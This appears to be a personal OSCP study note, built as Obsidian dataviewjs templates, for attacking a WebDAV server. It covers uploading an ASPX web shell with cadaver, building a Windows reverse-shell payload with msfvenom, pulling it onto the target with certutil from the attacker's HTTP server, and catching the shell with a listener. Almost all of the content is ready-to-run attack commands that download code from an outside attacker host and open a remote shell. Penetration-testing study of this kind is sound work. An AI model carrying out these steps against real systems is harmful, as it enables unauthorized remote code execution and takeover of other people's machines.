```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `cadaver http://${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
ls

With this in mind, we might be able to upload an ASPX payload that will give us RCE.

We can try uploading a web shell to the WebDAV server and see if we can access it from our search engine.

```
put /usr/share/webshells/aspx/cmdasp.aspx
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/cmdasp.aspx`;

dv.paragraph("```bash\n" + command + "\n```");
```
Access to webshell, 

Transfer aspx msfvenom payload into target, use webshell to download it over then execute

[[System Architecture]]

Windows x64 TCP Reverse shell EXE | PORT 135 | shell.aspx
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=135 -f aspx > shell.aspx`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
python -m http.server 80
```

Use this cmd in WEBSHELL
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}/shell.exe /Users/Public/shell.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
Start listener on KALI ATTACKER

```
cd ~/Desktop/Tools && python3 penelope.py -p 135 -O / --oscp-safe
```

Execute the shell.exe, in WEBSHELL

```
/Users/Public/shell.exe
```